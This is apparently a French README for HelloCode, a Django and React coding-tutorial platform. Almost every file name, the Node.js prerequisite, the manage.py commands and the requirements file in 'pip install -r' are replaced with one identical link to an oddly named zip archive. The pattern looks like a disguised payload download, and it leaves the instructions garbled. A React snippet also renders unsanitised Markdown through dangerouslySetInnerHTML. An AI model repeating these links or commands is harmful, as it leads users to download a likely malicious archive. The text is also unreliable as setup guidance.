# HelloCode – Plateforme d’Apprentissage de la Programmation

HelloCode est une plateforme web pour apprendre la programmation à travers des leçons, quiz, exercices de code et suivi de progression.  
Le projet utilise **Django** (backend, API, admin) et **React** (frontend).

---

## Fonctionnalités principales

- Inscription et connexion utilisateur (modèle personnalisé)
- Parcours de leçons par langage
- Quiz interactifs et exercices de code (Python, JavaScript, Java)
- Suivi de la progression et badges
- Interface d’administration Django (gestion des contenus)
- Support du formatage Markdown/HTML pour les leçons (images, listes, etc.)
- Exécution sécurisée de code côté serveur

---

## Structure du projet

```
backend/
├── accounts/                 # Gestion des utilisateurs
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèle User personnalisé
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des données utilisateur
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour authentification
│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour authentification
│
├── languages/               # Gestion des langages
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèles pour les langages
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des langages
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour les langages
│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour les langages
│
├── learning/                # Gestion de l'apprentissage
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Modèles pour leçons, quiz, exercices
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip       # Sérialisation des données d'apprentissage
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Vues pour l'apprentissage
│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes pour l'apprentissage
│
└── hellocode/              # Configuration Django
|   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip          # Paramètres du projet
|   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Routes principales
| └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip              # Configuration WSGI
frontend/
├── src/
│   ├── pages/              # Pages de l'application
│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip    # Page d'accueil
│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Page de leçon
│   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Page d'exercices (à créer)
│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Page de profil
│   │
│   ├── components/         # Composants réutilisables
│   │   ├── common/         # Composants communs
│   │   │   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Layout principal
│   │   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip  # Barre de navigation
│   │   │
│   │   └── learning/       # Composants d'apprentissage
│   │       ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Éditeur de code
│   │       └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip    # Composant de quiz
│   │
│   ├── api/                # Services API
│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip          # Configuration Axios
│   │
│   ├── contexts/           # Contextes React
│   │   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip # Contexte d'authentification
│   │
│   ├── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip           # Configuration globale
│   └── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip             # Composant principal
│
├── public/                 # Fichiers statiques
└── https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip            # Dépendances npm
```

---

## Installation

### 1. **Backend (Django)**

#### a) **Prérequis**
- Python 3.10+
- Java (pour l’exécution de code Java)
- https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip (pour l’exécution de code JavaScript)
- (Optionnel) [Git](https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip)

#### b) **Installation des dépendances**

Depuis le dossier `backend` :

```sh
python -m venv venv
venv\Scripts\activate  # Sous Windows
pip install -r https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip
```

**Si tu utilises l’édition riche dans l’admin, installe aussi :**
- Pour HTML :  
  ```sh
  pip install django-ckeditor
  ```
- Pour Markdown :  
  ```sh
  pip install django-markdownx
  ```

#### c) **Configuration Django**

- Ajoute `'ckeditor'` ou `'markdownx'` à `INSTALLED_APPS` dans `https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip` selon ton choix.
- Configure `MEDIA_ROOT` et `MEDIA_URL` si tu veux uploader des images.

#### d) **Migrations et superuser**

```sh
python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip makemigrations
python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip migrate
python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip createsuperuser
```

#### e) **Lancer le serveur**

```sh
python https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip runserver
```

---

### 2. **Frontend (React)**

Depuis le dossier `frontend` :

```sh
npm install
npm start
```

**Pour le rendu Markdown côté React (optionnel mais recommandé) :**
```sh
npm install marked
```
Et dans ton composant :
```tsx
import { marked } from "marked";
<div dangerouslySetInnerHTML={{ __html: https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip(https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip) }} />
```

---

## Utilisation

- Accède à l’admin Django : [http://localhost:8000/admin/](http://localhost:8000/admin/)
- Ajoute des leçons, quiz, exercices, etc. (le champ de contenu supporte Markdown ou HTML selon ta config)
- Accède à l’interface utilisateur : [http://localhost:5173/](http://localhost:5173/)
- Inscris-toi, progresse, gagne des badges !

---

## Dépendances principales

### **Backend**
- Django
- djangorestframework
- djangorestframework-simplejwt
- django-cors-headers
- Pillow
- django-ckeditor **ou** django-markdownx (édition riche)
- (optionnel) markdownx ou ckeditor pour l’admin

### **Frontend**
- React
- Axios
- marked (pour le rendu Markdown)

---

## Exécution de code

- **Python** : exécuté dans un environnement restreint côté serveur
- **JavaScript** : exécuté via https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip (doit être installé sur le serveur)
- **Java** : exécuté via javac/java (doit être installé sur le serveur)

---

## Personnalisation

- Pour ajouter des images ou du formatage dans les leçons, utilise le champ Markdown/HTML dans l’admin.
- Pour autoriser l’upload d’images, configure `MEDIA_ROOT` et `MEDIA_URL` dans `https://raw.githubusercontent.com/Miguel-max219/HelloCode-Fram-Python-ESMIA/main/frontend/src/components/common/HelloCode-Fram-Python-ESMIA_monocondylian.zip`.

---

## Licence

Ce projet est open-source et libre d’utilisation à des fins éducatives.
